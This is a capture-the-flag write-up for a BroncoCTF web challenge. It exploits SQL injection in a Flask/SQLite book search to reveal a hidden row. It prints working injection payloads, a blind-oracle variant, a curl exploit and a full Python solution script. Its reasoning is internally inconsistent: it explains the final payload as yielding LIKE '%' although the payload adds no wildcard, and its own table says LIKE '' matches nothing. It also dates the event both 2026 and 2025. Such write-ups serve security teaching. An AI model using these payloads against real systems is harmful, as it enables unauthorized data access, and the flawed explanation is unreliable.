# Forbidden Archives — BroncoCTF 2026 Web Challenge

> **Challenge:** Forbidden Archives  
> **Category:** Web  
> **Flag:** `bronco{y0u_d3f3@t3d_th3_h1gh_c0unc1l}`  

---

## Table of Contents

- [Challenge Description](#challenge-description)
- [Reconnaissance](#reconnaissance)
  - [Understanding the Application](#understanding-the-application)
  - [Identifying the Vulnerability](#identifying-the-vulnerability)
- [SQL Injection Analysis](#sql-injection-analysis)
  - [Template Reconstruction](#template-reconstruction)
  - [Testing Locally](#testing-locally)
- [Exploitation](#exploitation)
  - [The Working Payload](#the-working-payload)
  - [Bypassing OR Restrictions](#bypassing-or-restrictions)
- [Flag Retrieval](#flag-retrieval)
- [Full Solution Script](#full-solution-script)
- [Timeline & Tools](#timeline--tools)
- [Lessons Learned](#lessons-learned)

---

## Challenge Description

A Flask web application called *The Forbidden Archives* provides a search interface for querying a library of books. The results page mysteriously refuses to show "All of the World's Knowledge" — a forbidden book. Our goal is to make the application reveal this hidden book, which contains the flag.

The search endpoint at `/?search=<value>` appears to run SQL against a SQLite backend, and hints suggest the hidden book is protected by an `is_secret` flag in the database.

---

## Reconnaissance

### Understanding the Application

A normal search for `wizard` returns results:

```http
GET /?search=wizard
```

The page shows a single book card for *"A Wizard of Earthsea"*. An empty search returns nothing. Searching `%` (the SQL LIKE wildcard) returns the same book, confirming that the search value is plugged into a `LIKE` clause.

Sending a single quote (`'`) triggers a SQL error:

```
The ink smears: unrecognized token: "') AND is_secret = 0 LIMIT 1"
```

This is the **critical finding**. The error message reveals **three things** at once:

1. The SQL template is:  
   `SELECT * FROM books WHERE (title LIKE '<input>') AND is_secret = 0 LIMIT 1`
2. The `is_secret` column exists and is used to hide forbidden books.
3. Input is directly interpolated into the query — classic SQL injection.

### Identifying the Vulnerability

The application is built with Flask (Werkzeug/3.1.8, Python/3.14.6) and SQLite. The search parameter is a `GET` query string passed directly into the SQL query via string formatting — **not parameterized**. This is a textbook SQL injection.

Further error probing confirms the exact query structure:

| Input | SQL Produced | Behavior |
|-------|-------------|----------|
| `'` | `(title LIKE ''') AND is_secret = 0 LIMIT 1` | Error: unrecognized token |
| `%` | `(title LIKE '%%') AND is_secret = 0 LIMIT 1` | Returns *A Wizard of Earthsea* |
| `'||'` | `(title LIKE ''||'') AND is_secret = 0 LIMIT 1` | No error, no results (valid SQL, `LIKE ''` matches nothing) |

---

## SQL Injection Analysis

### Template Reconstruction

From the error message `"') AND is_secret = 0 LIMIT 1"` (the trailing portion after the injected `'`), the template is:

```sql
SELECT * FROM books WHERE (title LIKE '%s') AND is_secret = 0 LIMIT 1
```

Notice: there are **no `%` wildcards** in the template itself. The error output for `'` shows:

```
(title LIKE ''  ') AND is_secret = 0 LIMIT 1
               ↑
            The third ' opens a string containing the template tail
```

Breaking it down:

| Token | Source |
|-------|--------|
| `SELECT * FROM books WHERE (title LIKE '` | Template (before input) |
| `'` | Our injected single quote (closes the LIKE string) |
| `') AND is_secret = 0 LIMIT 1` | The template (after input) forms an unterminated string |

The template is **not** parameterized — it uses Python's `%` formatting or f-strings to embed the search value directly.

### Testing Locally

A local SQLite simulation confirms the vulnerability and the exact template:

```python
import sqlite3

db = sqlite3.connect(':memory:')
db.execute("CREATE TABLE books (title TEXT, is_secret INTEGER)")
db.execute("INSERT INTO books VALUES ('A Wizard of Earthsea', 0)")
db.execute("INSERT INTO books VALUES ('All of the World Knowledge', 1)")

# Simulate the vulnerable template
search = "') OR 1=1-- "
sql = f"SELECT * FROM books WHERE (title LIKE '{search}') AND is_secret = 0 LIMIT 1"
# SQL: (...) WHERE (title LIKE '') OR 1=1-- ') AND is_secret = 0 LIMIT 1
rows = list(db.execute(sql))
# Returns 2 rows — both books!
```

The `--` (SQLite line comment) works even without trailing whitespace, making the injection reliable.

---

## Exploitation

### The Working Payload

The simplest injection to return the secret book is:

```
') OR 1=1--
```

However, on the remote server, every payload using the `OR` keyword failed with `near "1": syntax error`. The `OR` operator appeared to be specifically problematic — possibly a parser quirk, SQLite version difference, or a custom filter.

Testing revealed that `AND` and `||` (SQLite concatenation) work flawlessly:

| Payload | `OR` | `AND` | `\|\|` |
|---------|------|-------|--------|
| `') [op] 1=1-- ` | ❌ `near "1"` | ✅ Returns book | ✅ Returns book |
| `') [op] 0-- ` | ❌ `near "0"` | ✅ No results | ✅ Returns book* |

*\* `|| 0` returns a book because `TRUE || 0` = `'10'` (non-empty string = truthy)*

The solution was to use `AND` instead:

```sql
') AND is_secret = 1--
```

This produces:

```sql
SELECT * FROM books 
WHERE (title LIKE '%') AND is_secret = 1-- ') AND is_secret = 0 LIMIT 1
```

After the `--` comment strips the rest:

```sql
SELECT * FROM books 
WHERE (title LIKE '%') AND is_secret = 1
```

- `LIKE '%'` matches **every** title (the `%` is a wildcard)
- `AND is_secret = 1` restricts to the **forbidden book only**
- The original `AND is_secret = 0 LIMIT 1` is fully commented out

### Bypassing OR Restrictions

The `OR` keyword error is likely caused by how the SQLite parser on the server handles the specific operator after the parenthetical. A hypothesis is that the parser version differs or the `)` before `OR` creates an unexpected grammar state. The pragmatic fix: **don't use `OR`**.

Alternative approaches that work:

```sql
') AND is_secret = 1--      -- Works — returns the secret book
') || 1--                   -- Works — returns first available book
') AND 1=1--                -- Works — returns first available book
') AND 0--                  -- Works — returns nothing
') || (SELECT 1 WHERE 1=1)-- -- Works — returned book (blind oracle)
') || (SELECT 1 WHERE 1=0)-- -- Works — returned nothing (blind oracle)
```

The blind SQL injection oracle with `|| (SELECT ... WHERE condition)-- ` can be used to extract arbitrary data character by character, but it wasn't needed here since the direct `AND is_secret = 1` payload worked.

---

## Flag Retrieval

The final exploit is a single cURL command:

```bash
curl 'https://broncoctf-forbidden-archives.chals.io/?search=%27%29%20AND%20is_secret%20%3D%201--%20'
```

Or using Python:

```python
import urllib.request, re

url = ('https://broncoctf-forbidden-archives.chals.io/?search='
       '%27%29%20AND%20is_secret%20%3D%201--%20')
resp = urllib.request.urlopen(url)
html = resp.read().decode()

# Extract flag
flag = re.search(r'<p>(bronco\{.*?\})</p>', html).group(1)
print(f"Flag: {flag}")
```

The response page for this payload reveals the previously hidden book **"All of the World's Knowledge"** with the flag in its description:

```
Author: Unknown
Description: bronco{y0u_d3f3@t3d_th3_h1gh_c0unc1l}
```

---

## Full Solution Script

```python
#!/usr/bin/env python3
"""
Forbidden Archives — BroncoCTF 2025
SQL injection to retrieve the secret book with is_secret = 1
"""

import urllib.request
import re

def exploit():
    # URL-encoded payload: ') AND is_secret = 1-- 
    payload = urllib.parse.quote("') AND is_secret = 1-- ", safe='')
    url = f'https://broncoctf-forbidden-archives.chals.io/?search={payload}'
    
    resp = urllib.request.urlopen(url, timeout=10)
    html = resp.read().decode()
    
    # Extract book title
    title = re.search(r'<h3>(.*?)</h3>', html)
    if title:
        print(f"Book: {title.group(1)}")
    
    # Extract the flag
    flag = re.search(r'<p>(bronco\{.*?\})</p>', html)
    if flag:
        print(f"Flag: {flag.group(1)}")
    
    return flag.group(1) if flag else None

if __name__ == '__main__':
    exploit()
```

---

## Timeline & Tools

| Step | Tool / Method | Finding |
|------|--------------|---------|
| 1 | Browser + curl | Search endpoint at `/?search=` |
| 2 | Single quote `'` injection | Reveals SQL error with template tail |
| 3 | Error parsing | Template: `(title LIKE '%s') AND is_secret = 0 LIMIT 1` |
| 4 | SQLite local simulation | Confirms vulnerability and test payloads |
| 5 | Payload fuzzing | `OR` keyword broken on remote; `AND` and `\|\|` work |
| 6 | `') AND is_secret = 1-- ` | Returns the secret book and flag |

**Tools used:**
- cURL / Python `urllib` for HTTP requests
- Python `sqlite3` for local testing
- Python `re` for HTML parsing
- Manual URL encoding

---

## Lessons Learned

1. **Error messages are gold.** The SQL error from a single `'` revealed the entire query structure, column name (`is_secret`), and limit clause.

2. **Test locally, attack remotely.** Simulating the exact query locally with SQLite helped validate injection approaches before hitting the server.

3. **Don't fight a broken operator.** The `OR` keyword was unreliable on this server. Switching to `AND` and `||` (concatenation) gave reliable control over the query logic.

4. **Read the full HTML response.** The flag was in a `<p>` tag in the book card description, not in the title.

5. **The author's hint was right.** The "simple bug" was a textbook SQL injection with string formatting — no need for UNION injections, blind extraction, or complex exploitation.
